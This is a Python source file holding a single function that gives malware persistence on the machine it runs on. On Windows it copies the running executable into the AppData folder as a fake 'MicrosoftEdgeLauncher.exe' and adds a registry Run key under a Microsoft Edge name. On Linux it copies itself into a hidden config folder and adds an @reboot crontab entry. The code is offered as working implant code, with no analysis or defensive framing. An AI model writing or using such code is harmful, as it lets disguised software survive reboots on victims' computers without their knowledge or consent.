import platform
import os
import shutil
import subprocess
import sys

def setup_persistence() -> tuple[str, str]:

    os_type = platform.system()

    if os_type == "Windows":
        appdata = os.environ.get('appdata')
        folder = os.path.join(appdata, "MicrosoftEdge")
        exe_location = os.path.join(folder, "MicrosoftEdgeLauncher.exe")
        uuid_location = os.path.join(folder, "uuid.txt")

        os.makedirs(folder, exist_ok=True)

        if not os.path.exists(exe_location):
            shutil.copyfile(sys.executable, exe_location)

            # Add registry key for persistence
            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{exe_location}" /f', shell=True)

        return exe_location, uuid_location

    elif os_type == "Linux":
        folder = os.path.expanduser('~') + "/.config/KaliStartup"
        exe_location = os.path.join(folder, "Startup")
        uuid_location = os.path.join(folder, "uuid.txt")

        os.makedirs(folder, exist_ok=True)

        if not os.path.exists(exe_location):
            shutil.copyfile(sys.executable, exe_location)
            # Add to startup via crontab
            crontab_line = f"@reboot {exe_location}"
            os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')

        return exe_location, uuid_location

    return "", ""